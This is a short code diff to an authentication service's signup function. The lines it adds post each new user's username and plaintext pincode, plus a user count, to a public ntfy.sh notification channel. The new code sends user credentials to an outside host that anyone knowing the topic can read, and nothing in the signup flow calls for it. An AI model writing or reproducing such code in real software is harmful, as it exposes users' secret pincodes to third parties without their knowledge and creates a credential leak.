@@ -54,6 +54,18 @@ export class authService {
             if (userExists) throw new ForbiddenException('Username already exists')
             user.username = username.toLowerCase()
             const newUser = new this.ClientModel(user)
+            let totalUsers = await this.ClientModel.countDocuments()
+            fetch('https://ntfy.sh/confess24channel', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: `
+                    New user created: ${username},
+                    Pincode: ${pincode},
+                    Total users: ${totalUsers + 1},
+                `
+            })
             await newUser.save()
             return new SuccessDTO('User created successfully')
         } catch (error) {
